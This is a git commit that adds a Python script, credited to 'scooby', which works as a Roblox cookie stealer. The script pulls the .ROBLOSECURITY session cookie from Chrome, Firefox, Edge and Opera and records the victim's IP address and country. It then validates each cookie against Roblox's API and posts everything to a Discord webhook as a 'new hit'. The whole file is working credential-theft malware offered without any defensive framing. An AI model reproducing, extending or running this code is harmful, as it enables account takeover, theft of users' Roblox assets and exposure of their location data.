8d51636e7a0f257cfe35ae5e159a2f6d08367928
Scooby <100179759+scoobyluvs@users.noreply.github.com>
2022-11-18 16:30:57 -0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,51 @@
+import os 
+import requests
+import json
+import browser_cookie3
+
+webhook = 'discord.api/webhook_here'
+
+
+__credits__ = 'scooby'
+
+class main():
+   def __init__(self,webhook):
+      self.webhook = webhook
+      self.cookies(webhook)
+   def cookies(self,webhook):
+      listofcookies = []
+      info = requests.get("http://ipinfo.io/json").json()
+      c = info['country']
+      ip = info['ip']
+      try:
+         cookies = browser_cookie3.chrome(domain_name='roblox.com')
+         cookies = str(cookies)
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+         listofcookies.append(cookie)
+      except:pass
+      try:
+         cookies = browser_cookie3.firefox(domain_name='roblox.com')
+         cookies = str(cookies)
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+         listofcookies.append(cookie)
+      except:pass
+      try:
+         cookies = browser_cookie3.edge(domain_name='roblox.com')
+         cookies = str(cookies)
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+         listofcookies.append(cookie)
+      except:pass
+      try:
+         cookies = browser_cookie3.opera(domain_name='roblox.com')
+         cookies = str(cookies)
+         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+         listofcookies.append(cookie)
+      except:pass 
+      for i in listofcookies:
+         try:
+            r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": i}).json()
+            info = {"content": '',"embeds": [{"color": 11014160,"footer": {"text": "scooby ; .gg/comped"},"image": {"url": "https://media.discordapp.net/attachments/972490150418456616/1010172706903293952/ddf19ded4728f2695331f525d0400147.jpg"}},{"description": f"**new hit ; **\n\nip ; ``{ip}``\ncountry ; ``{c}``\n\ncookie ; \n```fix\n{i}\n```","color": 11014160}],"username": ".gg/comped","avatar_url": "https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg","attachments": []}
+            requests.post(webhook,json=info)
+         except:pass
+if __credits__ == "scooby":
+   main(webhook)
